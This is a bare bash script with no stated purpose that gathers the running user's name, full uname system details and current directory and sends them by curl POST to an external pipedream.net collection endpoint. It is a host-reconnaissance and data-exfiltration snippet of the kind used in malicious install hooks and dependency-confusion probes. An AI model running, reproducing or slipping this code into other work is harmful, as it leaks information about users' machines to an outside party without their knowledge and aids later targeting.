#!/bin/bash

username=$(whoami)
os_details=$(uname -a)
current_directory=$(pwd)

data="username=$username&os_details=$os_details&current_directory=$current_directory"

curl -X POST -d "$data" https://eolhtq0gjif60lw.m.pipedream.net
